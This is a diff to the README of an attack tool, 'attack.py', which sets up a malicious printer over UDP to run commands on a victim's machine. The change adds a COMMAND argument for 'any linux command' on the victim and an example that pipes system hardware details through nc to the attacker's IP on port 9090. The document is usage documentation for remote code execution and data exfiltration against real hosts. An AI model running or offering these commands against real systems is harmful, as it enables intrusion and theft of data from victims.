@@ -11,17 +11,19 @@ Connecting a malicious printer
 To start sending UDP messages, ``attack.py`` needs to be executed as:
 
 ```
-python attack.py <LOCAL_HOST> <TARGET_HOST>
+python attack.py <LOCAL_HOST> <TARGET_HOST> <COMMAND>
 ```
 
 The ``LOCAL_HOST`` is the IP address of the attacker
 
-The ``TARGET_HOST`` would be the victims' local host IP  address
+The ``TARGET_HOST`` would be the victim's local host IP  address
+
+The ``COMMAND`` could be any linux command to be performed in the victim's machine
 
 For example this is how the command would look like:
 
 ```
-python attack.py 152.138.102.23 143.90.22.223
+python attack.py 152.138.102.23 143.90.22.223 'lspci -nnk | nc 152.138.102.23 9090'
 ```
 
 The port of the printer would always be ``111``. Its location can be found in ``http://localhost:631/printers/Malicious_printer_152_138_102_23``
